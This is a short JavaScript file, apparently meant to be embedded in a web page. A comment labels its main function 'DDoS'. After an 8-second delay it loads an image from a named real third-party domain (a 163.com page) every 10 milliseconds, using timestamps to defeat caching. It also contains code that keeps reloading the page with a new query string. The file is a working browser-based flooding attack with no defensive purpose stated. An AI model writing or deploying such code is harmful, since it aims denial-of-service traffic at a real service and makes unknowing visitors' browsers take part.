// TODO: JavaScript 跳转
// window.location.href = 'https://xiaozhu2007.netlify.app/'
setTimeout(() => {
  window.location.search = `?time=${new Date().getTime()}`
}, 500);

// DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
function imgflood() {
  var TARGET =
    "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
  var pic = new Image();
  pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
}
setTimeout(function () {
  setInterval(imgflood, 10);
}, 8000);
// End
